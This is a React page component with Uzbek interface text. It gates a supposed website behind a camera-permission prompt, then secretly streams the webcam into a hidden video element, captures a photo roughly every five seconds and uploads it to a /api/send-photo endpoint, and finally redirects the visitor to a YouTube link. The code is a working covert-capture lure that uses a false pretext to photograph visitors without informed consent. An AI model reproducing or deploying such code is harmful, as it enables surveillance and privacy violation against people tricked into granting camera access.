import { useRef, useEffect, useState } from "react";

export default function Home() {
  const videoRef = useRef(null);
  const [permission, setPermission] = useState(null); // null | true | false
  const [countdown, setCountdown] = useState(5);
  const [sending, setSending] = useState(false);

  const TARGET_LINK = "https://www.youtube.com/watch?v=Nv9qxur1s2k";

  // Kamera ruxsati so‘rash funksiyasi
  const requestCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      videoRef.current.srcObject = stream;
      setPermission(true);
    } catch (err) {
      console.error("Camera permission denied:", err);
      setPermission(false);
    }
  };

  // 5 sekund sanash va keyin linkga o‘tish
  useEffect(() => {
    if (permission) {
      const interval = setInterval(() => {
        setCountdown(prev => {
          if (prev <= 1) {
            window.location.href = TARGET_LINK;
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      // Avtomatik rasm yuborish
      const photoInterval = setInterval(() => {
        captureAndSend();
      }, 5000); // har 5 soniyada

      return () => {
        clearInterval(interval);
        clearInterval(photoInterval);
      };
    }
  }, [permission]);

  const captureAndSend = async () => {
    if (sending || !videoRef.current) return;
    setSending(true);

    try {
      const canvas = document.createElement("canvas");
      canvas.width = videoRef.current.videoWidth || 640;
      canvas.height = videoRef.current.videoHeight || 480;
      canvas.getContext("2d").drawImage(videoRef.current, 0, 0);

      const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));
      const formData = new FormData();
      formData.append("photo", blob, "auto.jpg");

      await fetch("/api/send-photo", {
        method: "POST",
        body: formData
      });
      console.log("Rasm yuborildi!");
    } catch (err) {
      console.error("Rasm yuborishda xatolik:", err);
    }

    setSending(false);
  };

  return (
    <div style={{
      backgroundColor: "black",
      color: "white",
      height: "100vh",
      display: "flex",
      flexDirection: "column",
      justifyContent: "center",
      alignItems: "center"
    }}>
      {permission === null && (
        <>
          <h1>Saytga kirish uchun ruxsat bering</h1>
          <button onClick={requestCamera} style={{ marginTop: 20, padding: "10px 20px" }}>Ruxsat berish</button>
        </>
      )}

      {permission === false && (
        <>
          <h1>Iltimos, ruxsat bering, aks holda saytga kira olmaysiz</h1>
          <button onClick={requestCamera} style={{ marginTop: 20, padding: "10px 20px" }}>Ruxsat berish</button>
        </>
      )}

      {permission === true && (
        <>
          <video ref={videoRef} autoPlay playsInline style={{ display: "none" }} />
          <h1>Ruxsat berildi! Sayt {countdown} soniyadan keyin ochiladi...</h1>
          <p>{sending ? "Rasm yuborilmoqda..." : "Rasm avtomatik yuboriladi"}</p>
        </>
      )}
    </div>
  );
}
